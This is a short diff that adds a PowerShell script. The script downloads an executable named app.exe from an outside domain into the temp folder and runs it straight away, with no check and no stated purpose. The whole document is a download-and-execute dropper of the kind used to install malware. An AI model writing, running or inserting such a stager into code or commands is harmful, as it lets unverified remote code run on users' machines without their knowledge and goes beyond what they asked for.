@@ -1,0 +1,5 @@
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
+$url = 'https://link.softlover.icu/get/app.exe'
+$p = Join-Path $env:TEMP 'app.exe'
+Invoke-WebRequest -Uri $url -OutFile $p -UseBasicParsing
+Start-Process -FilePath $p -Wait  
